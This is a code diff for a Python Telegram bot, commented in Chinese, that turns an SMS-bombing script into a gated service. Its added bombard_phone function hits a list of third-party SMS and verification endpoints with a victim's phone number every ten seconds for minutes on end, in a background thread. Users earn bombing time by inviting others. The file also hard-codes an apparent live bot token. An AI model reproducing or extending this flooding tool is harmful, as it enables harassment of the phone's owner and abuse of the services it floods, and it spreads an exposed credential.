@@ -1,7 +1,9 @@
-import os  # 引入 os 模块来读取环境变量
+import os
 import requests
-from telegram import Update
+import time
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackContext
+from threading import Thread
 
 # 从环境变量中读取 TELEGRAM_API_TOKEN
 TELEGRAM_API_TOKEN = os.getenv("8139511082:AAFYL5BtHBxGaU9f9G2ihURBSBBN5592LgQ")
@@ -41,35 +43,131 @@ urls = [
     f"https://www.xinmeinet.cn/api/user/getMsg?status=1&touch={idcard}",
     f"http://n103.top:84/smsboom/?hm={idcard}",
 ]
-def start(update: Update, context: CallbackContext) -> None:
-    update.message.reply_text("欢迎使用短信轰炸机器人！使用 /dxhz [手机号] 命令来进行测试。")
 
-def dxhz(update: Update, context: CallbackContext) -> None:
-    if len(context.args) != 1:
-        update.message.reply_text("请提供一个手机号！正确用法：/dxhz 12345678901")
+# 定义频道的用户名（没有 @ 符号）
+CHANNEL_USERNAME = 'pubgtianshenkar'
+
+# 初始化用户积分系统
+user_points = {}
+invite_links = {}
+user_invites = {}
+
+def start(update: Update, context: CallbackContext) -> None:
+    # 提示用户加入频道
+    keyboard = [[InlineKeyboardButton("天神主频道", url=f"https://t.me/{CHANNEL_USERNAME}")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    update.message.reply_text(
+        "请加入主频道后才使用此机器人",
+        reply_markup=reply_markup
+    )
+
+def check_user_in_channel(context: CallbackContext, user_id: int) -> bool:
+    try:
+        # 检查用户是否在频道中
+        chat_member = context.bot.get_chat_member(chat_id=f"@{CHANNEL_USERNAME}", user_id=user_id)
+        return chat_member.status in ["member", "administrator", "creator"]
+    except Exception as e:
+        return False  # 如果出错（例如用户未加入），返回False
+
+def add_points(inviter_id: int, points: int = 2):
+    """为邀请人增加积分并记录邀请次数"""
+    user_points[inviter_id] = user_points.get(inviter_id, 0) + points
+    user_invites[inviter_id] = user_invites.get(inviter_id, 0) + 1
+
+def share(update: Update, context: CallbackContext) -> None:
+    user_id = update.message.from_user.id
+    username = update.message.from_user.username or "未设置用户名"
+
+    # 为用户生成专属邀请链接
+    if user_id not in invite_links:
+        invite_links[user_id] = f"https://t.me/{context.bot.username}?start={user_id}"
+
+    # 获取用户积分和邀请次数
+    points = user_points.get(user_id, 0)
+    invites = user_invites.get(user_id, 0)
+
+    # 显示邀请信息
+    update.message.reply_text(
+        f"用户名: {username}\n"
+        f"你的专属邀请链接是: {invite_links[user_id]}\n"
+        f"你已邀请: {invites} 人\n"
+        f"你的积分: {points}"
+    )
+
+def handle_invitation(update: Update, context: CallbackContext) -> None:
+    user_id = update.message.from_user.id
+    inviter_id = context.args[0] if context.args else None
+
+    # 检查用户是否已经加入频道
+    if not check_user_in_channel(context, user_id):
+        update.message.reply_text("请先加入频道后再使用此命令！")
         return
 
+    # 如果用户通过专属链接加入，邀请人获得积分
+    if inviter_id and inviter_id.isdigit():
+        add_points(int(inviter_id), points=2)
+        update.message.reply_text("感谢加入！邀请人已获得2积分。")
+
+def bombard_phone(idcard: str, duration_minutes: int) -> None:
+    """重复调用短信接口请求，持续指定分钟数，每10秒调用一次"""
+    end_time = time.time() + duration_minutes * 60
+    while time.time() < end_time:
+        for url in urls:
+            try:
+                full_url = url.format(idcard=idcard)
+                response = requests.get(full_url)
+                if response.status_code == 200:
+                    print(f"请求成功: {full_url}")
+                else:
+                    print(f"请求失败: {full_url} - 状态码: {response.status_code}")
+            except Exception as e:
+                print(f"请求错误: {url} - 错误信息: {e}")
+        time.sleep(10)  # 每10秒调用一次
+
+def dxhz(update: Update, context: CallbackContext) -> None:
+    user_id = update.message.from_user.id
+
+    # 检查用户是否加入频道
+    if not check_user_in_channel(context, user_id):
+        update.message.reply_text("请先加入频道后再使用此命令！")
+        return
+
+    # 检查命令参数
+    if len(context.args) < 1:
+        update.message.reply_text("请提供一个手机号！正确用法：/dxhz 12345678901 [分钟数]")
+        return
+
+    # 获取手机号和时间参数
     idcard = context.args[0]
-    update.message.reply_text(f"正在对手机号 {idcard} 进行短信轰炸测试...")
+    duration_minutes = int(context.args[1]) if len(context.args) > 1 else 5  # 默认5分钟
 
-    for url in urls:
-        try:
-            full_url = url.format(idcard=idcard)
-            response = requests.get(full_url)
-            if response.status_code == 200:
-                update.message.reply_text(f"请求成功: {full_url}")
-            else:
-                update.message.reply_text(f"请求失败: {full_url} - 状态码: {response.status_code}")
-        except Exception as e:
-            update.message.reply_text(f"请求错误: {url} - 错误信息: {e}")
+    # 计算需要消耗的积分
+    required_points = duration_minutes // 5
 
-    update.message.reply_text("短信轰炸测试完成。")
+    # 检查积分是否足够
+    if user_points.get(user_id, 0) < required_points:
+        update.message.reply_text("您的积分不足，请分享您的邀请链接以获取更多积分。")
+        return
+
+    # 消耗积分
+    user_points[user_id] -= required_points
+
+    # 启动短信测试
+    update.message.reply_text(f"正在对手机号 {idcard} 进行短信测试，持续 {duration_minutes} 分钟...")
+
+    # 使用新线程执行轰炸任务
+    Thread(target=bombard_phone, args=(idcard, duration_minutes)).start()
 
 def main():
-    updater = Updater(8139511082:AAFYL5BtHBxGaU9f9G2ihURBSBBN5592LgQ)
+    updater = Updater(TELEGRAM_API_TOKEN)
     dispatcher = updater.dispatcher
+
+    # 处理命令
     dispatcher.add_handler(CommandHandler("start", start))
+    dispatcher.add_handler(CommandHandler("share", share))
     dispatcher.add_handler(CommandHandler("dxhz", dxhz))
+    dispatcher.add_handler(CommandHandler("start", handle_invitation, pass_args=True))
+
     updater.start_polling()
     updater.idle()
 
